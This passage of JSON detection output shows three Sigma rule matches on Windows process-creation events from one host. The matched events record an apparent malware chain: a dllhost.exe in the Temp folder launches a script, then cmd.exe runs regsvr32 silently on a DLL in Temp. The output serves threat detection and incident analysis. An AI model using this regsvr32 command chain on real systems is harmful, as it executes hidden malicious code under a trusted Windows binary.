                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7495-6551-4706-000000004800}; ProcessId=8032; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-748C-6551-3E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8176; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c C:\\Windows\\system32\\regsvr32 /i /s C:\\Users\\george\\AppData\\Local\\Temp\\libeay32.dll; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837077; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "16502dbca7468597f52d37ca5a5a0f5c904c43f0ca2b6726d890a67a63b68516",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Unusual Parent Process For Cmd.EXE",
                                                                       "rule_description":  "Detects suspicious parent process for cmd.exe",
                                                                       "rule_author":  "Tim Rauch"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7495-6551-4906-000000004800}; ProcessId=3444; Product=Microsoft\\xae Windows\\xae Operating System; Description=Microsoft(C) Register Server; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7495-6551-4706-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=426E7499F6A7346F0410DEAD0805586B,SHA256=4DC13CBE6F048809D49B0095B1691104E5A64ECA6BCC2A6243C074CB91D038E9,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8; OriginalFileName=REGSVR32.EXE; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8032; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\regsvr32  /i /s C:\\Users\\george\\AppData\\Local\\Temp\\libeay32.dll; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\SysWOW64\\regsvr32.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c C:\\Windows\\system32\\regsvr32 /i /s C:\\Users\\george\\AppData\\Local\\Temp\\libeay32.dll; UtcTime=1699837077; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "3c839a03f4fc9d7988e0debb79087dea4e4584fa05c3ee8cd7aad8c037b505cf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Scripting/CommandLine Process Spawned Regsvr32",
                                                                       "rule_description":  "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7495-6551-4906-000000004800}; ProcessId=3444; Product=Microsoft\\xae Windows\\xae Operating System; Description=Microsoft(C) Register Server; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7495-6551-4706-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=426E7499F6A7346F0410DEAD0805586B,SHA256=4DC13CBE6F048809D49B0095B1691104E5A64ECA6BCC2A6243C074CB91D038E9,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8; OriginalFileName=REGSVR32.EXE; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8032; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\regsvr32  /i /s C:\\Users\\george\\AppData\\Local\\Temp\\libeay32.dll; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\SysWOW64\\regsvr32.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c C:\\Windows\\system32\\regsvr32 /i /s C:\\Users\\george\\AppData\\Local\\Temp\\libeay32.dll; UtcTime=1699837077; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "49c4c4517c1ca707a5dfadad1b8db8afe6380c4546c944335aee3a1fadcc5542",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Regsvr32 Execution From Potential Suspicious Location",
                                                                       "rule_description":  "Detects execution of regsvr32 where the DLL is located in a potentially suspicious location.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
